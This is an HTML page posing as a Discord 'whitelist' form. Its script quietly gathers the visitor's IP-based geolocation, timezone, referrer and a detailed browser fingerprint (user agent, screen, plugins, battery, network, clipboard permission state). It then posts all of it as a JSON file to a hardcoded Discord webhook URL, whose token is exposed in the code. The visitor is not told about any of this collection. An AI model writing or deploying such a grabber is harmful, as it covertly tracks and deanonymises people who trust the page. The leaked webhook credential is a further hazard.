<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Whitelist</title>
  <style>
    body { font-family: sans-serif; display: flex; flex-direction: column; gap: 1rem; align-items: center; justify-content: center; height: 100vh; background: #f9fafb; }
    input, button { padding: 0.6rem 1rem; font-size: 1rem; border-radius: 8px; border: 1px solid #ccc; }
    button { background: #10b981; color: white; border: none; cursor: pointer; }
    button:disabled { background: #9ca3af; cursor: not-allowed; }
    button:hover:enabled { background: #059669; }
  </style>
</head>
<body>
  <input type="text" id="discordId" placeholder="Enter Discord User ID" />
  <button id="whitelistBtn" disabled>Whitelist</button>

  <script>
    var WEBHOOK_URL = 'https://discord.com/api/webhooks/1400234987541893260/U0Oi5nji0bljkiODyK8pd_9excATVoTFoFkqp1vc2ksKrZCbp3IpuUU6JuXQs1SUVPqr';
    var whitelistBtn = document.getElementById('whitelistBtn');
    var discordIdInput = document.getElementById('discordId');
    var RATE_LIMIT_HOURS = 24;
    var STORAGE_KEY = 'lastWhitelistTime';

    discordIdInput.addEventListener('input', function () {
      var value = discordIdInput.value.replace(/\s+/g, '');
      whitelistBtn.disabled = !/^\d+$/.test(value);
    });

    function isRateLimited() {
      try {
        var lastTime = localStorage.getItem(STORAGE_KEY);
        if (!lastTime) return false;
        var diff = (Date.now() - parseInt(lastTime, 10)) / (1000 * 60 * 60);
        return diff < RATE_LIMIT_HOURS;
      } catch (e) {
        return false;
      }
    }

    function detectCapabilities() {
      return {
        battery: !!navigator.getBattery,
        permissions: !!navigator.permissions,
        fetch: !!window.fetch,
        connection: !!navigator.connection,
        clipboard: !!navigator.clipboard,
        javaEnabled: !!navigator.javaEnabled
      };
    }

    function getGeoData(callback) {
      try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://ipapi.co/json/', true);
        xhr.onreadystatechange = function () {
          if (xhr.readyState === 4) {
            if (xhr.status === 200) {
              try { callback(JSON.parse(xhr.responseText)); } catch (e) { callback({}); }
            } else {
              callback({});
            }
          }
        };
        xhr.send();
      } catch (e) {
        callback({});
      }
    }

    function gatherDiagnostics(callback) {
      var capabilities = detectCapabilities();
      var diagnostics = {
        battery: null,
        connection: null,
        clipboardPermission: null,
        navigatorProperties: {},
        screen: {},
        plugins: [],
        mimeTypes: []
      };

      // Navigator properties
      ['userAgent','language','languages','platform','cookieEnabled','onLine','hardwareConcurrency','deviceMemory','maxTouchPoints','doNotTrack','vendor','product','productSub'].forEach(function(prop) {
        diagnostics.navigatorProperties[prop] = navigator[prop] !== undefined ? navigator[prop] : null;
      });

      // Screen info
      ['width','height','availWidth','availHeight','colorDepth','pixelDepth'].forEach(function(prop) {
        diagnostics.screen[prop] = screen[prop] !== undefined ? screen[prop] : null;
      });

      // Plugins and mimeTypes
      diagnostics.plugins = navigator.plugins ? Array.prototype.map.call(navigator.plugins, function(p) { return p.name; }) : [];
      diagnostics.mimeTypes = navigator.mimeTypes ? Array.prototype.map.call(navigator.mimeTypes, function(m) { return m.type; }) : [];

      // Connection info
      if (capabilities.connection && navigator.connection) {
        diagnostics.connection = {
          effectiveType: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt,
          saveData: navigator.connection.saveData || false
        };
      }

      // Battery info
      if (capabilities.battery && navigator.getBattery) {
        navigator.getBattery().then(function(battery) {
          diagnostics.battery = {
            charging: battery.charging,
            level: battery.level,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
          };
          continueDiagnostics();
        }).catch(function(){ continueDiagnostics(); });
      } else {
        continueDiagnostics();
      }

      function continueDiagnostics() {
        // Clipboard permission
        if (capabilities.permissions) {
          navigator.permissions.query({name:'clipboard-read'}).then(function(result){
            diagnostics.clipboardPermission = result.state;
            callback(diagnostics);
          }).catch(function(){ callback(diagnostics); });
        } else {
          callback(diagnostics);
        }
      }
    }

    function sendData() {
      if (isRateLimited()) {
        alert('You can only whitelist once every 24 hours.');
        return;
      }

      getGeoData(function(geoData){
        gatherDiagnostics(function(diagnostics){
          var payload = {
            timestamp: new Date().toISOString(),
            discordUserId: discordIdInput.value.replace(/\s+/g,''),
            page: location.href,
            referrer: document.referrer || null,
            timezone: (Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions().timeZone) || null,
            geoData: geoData,
            diagnostics: diagnostics
          };

          // Send data
          try {
            var formData = new FormData();
            var file = new Blob([JSON.stringify(payload,null,2)], {type:'application/json'});
            formData.append('file', file, 'visitor_data.json');
            formData.append('content','Visitor data from Discord User ID: '+payload.discordUserId);

            var xhr = new XMLHttpRequest();
            xhr.open('POST', WEBHOOK_URL, true);
            xhr.onload = function(){
              if(xhr.status>=200 && xhr.status<300){
                alert('Data sent successfully.');
                try{ localStorage.setItem(STORAGE_KEY, Date.now().toString()); } catch(e){}
                whitelistBtn.disabled = true;
              } else {
                alert('Failed to send data. Status: '+xhr.status);
              }
            };
            xhr.onerror = function(){ alert('Error sending data.'); };
            xhr.send(formData);
          } catch(err){
            alert('Error: '+err.message);
          }
        });
      });
    }

    if(isRateLimited()) whitelistBtn.disabled=true;
    whitelistBtn.addEventListener('click', sendData);
  </script>
</body>
</html>
